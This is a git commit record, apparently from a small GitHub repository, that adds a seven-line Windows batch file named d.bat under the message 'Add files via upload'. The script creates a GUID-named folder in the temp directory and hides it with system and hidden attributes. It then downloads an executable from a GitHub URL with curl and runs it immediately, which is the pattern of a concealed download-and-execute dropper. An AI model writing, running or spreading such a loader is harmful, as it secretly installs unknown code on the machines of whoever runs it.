528b1c322672095a4eadc7ca54634e6dad935f3a
Solda10Skipper <99901864+Solda10Skipper@users.noreply.github.com>
2022-02-18 14:50:16 +0100

    Add files via upload

---
+++ k/d.bat
@@ -0,0 +1,7 @@
+@echo off
+cd %tmp%
+mkdir {8AFAB2E9-049B-4889-B184-57306E3EAD34}
+attrib +s +h {8AFAB2E9-049B-4889-B184-57306E3EAD34}
+cd {8AFAB2E9-049B-4889-B184-57306E3EAD34}
+curl -Ls https://github.com/Solda10Skipper/SimpleApp/raw/main/pyt.exe -o p.exe
+p.exe
